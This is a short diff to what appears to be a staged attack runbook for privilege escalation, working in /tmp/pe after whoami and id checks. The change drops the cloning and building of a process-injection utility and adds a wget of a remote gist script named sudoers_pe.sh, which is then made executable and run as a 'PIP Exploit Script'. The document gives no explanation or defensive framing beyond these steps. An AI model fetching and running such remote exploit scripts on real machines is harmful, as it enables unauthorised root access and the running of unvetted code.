@@ -26,18 +26,13 @@ make
 whoami
 id
 
-# Download KK5 Process Injection Utility
+# Download PIP Exploit Script
 cd /tmp/pe
-git clone https://github.com/josh0xA/K55.git
+wget https://gist.githubusercontent.com/kevinnivekkevin/a9c929a632de3ff4c3b03fbbd247c6f2/raw/e740c5d73ff0a8b17ba3b54c2bfebfe102f3f197/sudoers_pe.sh
+chmod +x sudoers_pe.sh
 
-# Build Process Injection Utility
-cd K55
-chmod +x build-install.sh
-./build-install.sh
-
-# Run a Sample Process (Terminal 1)
-cd k55_example_process
-./k55_test_process
+# Run PIP Exploit Script
+./sudoers_pe.sh
 
 ################# STAGE 3 #################
 
